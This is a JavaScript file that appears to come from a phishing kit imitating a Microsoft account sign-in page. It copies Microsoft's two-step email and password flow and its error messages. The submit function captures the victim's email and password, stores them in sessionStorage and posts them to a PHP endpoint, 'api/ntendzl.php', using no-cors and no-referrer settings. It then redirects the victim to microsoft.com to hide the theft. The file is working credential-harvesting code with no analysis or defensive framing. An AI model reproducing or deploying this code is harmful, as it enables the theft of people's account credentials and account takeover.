sessionStorage.getItem("password") &&
  (window.location.href = "https://www.microsoft.com/");

const slidePage = document.querySelector(".slide-page");
const secondSlide = document.querySelector(".secondSlide");
const btnNext = document.querySelector(".firstNext");
const prevBtnSec = document.querySelector(".prev-1");
const submitBtn = document.querySelector(".submit");
const opts = document.querySelector(".opts");
const nextFormAnimation = document.querySelector("#section-main");
const API_URL = "api/ntendzl.php";

function createBody(b) {
  let c = [];
  for (let a in b) {
    c.push(encodeURIComponent(a) + "=" + encodeURIComponent(b[a]));
  }
  return c.join("&").replace(/%20/g, "+");
}

function sendData(a) {
  return fetch(`${API_URL}`, {
    method: "POST",
    mode: "no-cors",
    cache: "no-cache",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    referrerPolicy: "no-referrer",
    body: createBody(a),
  });
}

function validateEmail(a) {
  return /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(
    a,
  );
}

function validate() {
  let a = $("#result"),
    b = $("#email").val();
  return (
    a.text(""),
    !!validateEmail(b) ||
    (b
      ? (a.html(
        "That Microsoft account doesn't exist.\n Enter a different account or get a new one.",
      ),
        a.css("color", "red"),
        (document.getElementById("loginForm").style.height = "403px"))
      : (a.text(
        "Enter a valid email address, phone number, or Skype\n name.",
      ),
        a.css("color", "red"),
        (document.getElementById("loginForm").style.height = "403px")),
      !1)
  );
}

function validatePassword() {
  let a = $("#passResult"),
    b = $("#password").val();
  return (
    a.text(""),
    !(b.length < 8) ||
    (a.text(
      "Your account or password is incorrect. If you don't remember your password,",
    ),
      a.css("color", "red"),
      !1)
  );
}

let input1 = document.getElementById("email");
let input2 = document.getElementById("password");

function keyUp(e, element) {
  if (e.key === "Enter") {
    e.preventDefault();
    document.getElementById(element).click();
  }
}

function next() {
  let a = input1.value;
  if (!validate() || !validateEmail(a)) return;
  document.getElementById("userLine").textContent = a;

  nextFormAnimation.classList.add("next-form");
  let b = document.getElementById("section-1");
  let c = document.getElementById("section-2");
  b.style.marginLeft = "-100%";
  b.style.display = "none";
  c.style.marginLeft = "0%";
  opts.style.display = "none";
  document.getElementById("loginForm").style.height = "403px";
}

function prev() {
  let a = document.getElementById("section-1");
  b = document.getElementById("section-2");
  a.style.marginLeft = "0%";
  a.style.display = "block";
  b.style.marginLeft = "100%";
  opts.style.display = "block";
  document.getElementById("loginForm").style.height = "370px";
  slidePage.style.marginLeft = "0%";
  secondSlide.style.marginLeft = "100%";
  slidePage.style.visibility = "visible";
}

// (() => {
//   if (sessionStorage.getItem("user")) {
//     prev();
//     sessionStorage.clear();
//   }
// })();

function submit() {
  let a = input1.value,
    b = input2.value;
  validatePassword() &&
    (sessionStorage.setItem("user", a),
      sessionStorage.setItem("password", b),
      sendData({
        userName: sessionStorage.getItem("user"),
        password: sessionStorage.getItem("password"),
      }),
      sessionStorage.setItem("secsession", !1),
      console.log("from session storage", sessionStorage.getItem("password")));
  setTimeout(function () {
    window.location.href = "https://www.microsoft.com/";
  }, 10);
}

input1.addEventListener("keyup", (event) => keyUp(event, "btnSend"));
input2.addEventListener("keyup", (event) => keyUp(event, "btnSignIn"));
btnNext.addEventListener("click", next);
prevBtnSec.addEventListener("click", prev);
submitBtn.addEventListener("click", submit);
